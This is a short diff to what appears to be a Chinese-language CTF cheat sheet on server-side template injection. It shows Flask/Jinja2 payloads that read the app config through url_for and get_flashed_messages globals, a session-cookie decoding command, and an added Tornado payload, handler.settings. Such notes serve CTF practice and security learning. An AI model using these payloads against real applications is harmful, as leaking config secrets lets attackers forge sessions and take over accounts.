@@ -107,3 +107,5 @@ python .\flask_session_cookie_hack.py decode -c eyJuMWNvZGUiOm51bGx9.X92dcQ.uupV
 ```{{get_flashed_messages.__globals__.__getitem__('current_app').config}}```
 - **url_for减少字符长度**  
 ```{{url_for.__globals__.__getitem__('current_app').config}} ```
+- ***Tornado Web server的SSTI*
+```handler.settings```
